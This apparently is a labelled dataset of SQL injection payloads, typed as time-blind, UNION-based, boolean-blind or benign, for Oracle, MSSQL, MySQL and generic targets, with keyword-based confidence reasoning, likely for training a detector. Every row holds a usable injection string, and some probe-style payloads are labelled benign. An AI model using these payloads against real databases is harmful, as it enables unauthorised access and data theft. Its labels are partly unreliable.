id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21214,"1' where 8869 = 8869 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21275,"1"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21396,"1"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21209,"1%"" order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 15 chars.,2
21229,1' ) waitfor delay '0:0:5' and ( 'fpnh' = 'fpnh,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
21289,"iif ( 1095 = 2853,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
21308,1' ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 17 chars.,2
21309,"-2384'|| ( select 'vhcp' from dual where 1266 = 1266 union all select 1266,1266,1266,1266--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
21321,waitfor delay '0:0:5' and ( '%' = ',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
21208,"1"" ) where 1870 = 1870 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 81 chars.,2
21221,-1492 where 2788 = 2788 union all select 2788#,union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
21223,"-3283 ) where 1948 = 1948 union all select 1948,1948,1948#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
21227,"-8608"" or 5460 = 4461--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
21236,"1"" ) ) as hfma where 2654 = 2654 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2
21238,"1 ) as wokl where 1368 = 1368 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
21242,"-5078 union all select 9708,9708--",union_based,generic,0.7,UNION-based payload detected. Payload length: 34 chars.,2
21246,-6129 ) as vuze where 1565 = 1565 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2
21247,"-8325 ) ) as ajxq where 6630 = 6630 union all select 6630,6630,6630,6630,6630,6630--",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
21249,"-7941%' ) union all select 6965,6965,6965,6965--",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
21251,"-8034"" ) where 1292 = 1292 union all select 1292,1292,1292,1292,1292#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
21254,"1' union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
21262,-1436' or 5699 = 5783--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
21263,"-1033 union all select 8731,8731,8731,8731,8731,8731--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
21264,-4572' ) union all select 3520--,union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
21266,-8056 ) ) as botl where 9225 = 9225 or ( 1182 = 7641 ) *7641--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 62 chars.,2
21268,"-9227 ) where 6723 = 6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",union_based,generic,0.7,UNION-based payload detected. Payload length: 94 chars.,2
21270,"1"" where 2619 = 2619 and 2823 = 5100#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
21278,"-5317' ) ) union all select 7673,7673,7673,7673,7673,7673#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
21283,"1%' ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 38 chars.,2
21284,1' where 5819 = 5819 and ( 1275 = 4759 ) *4759--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
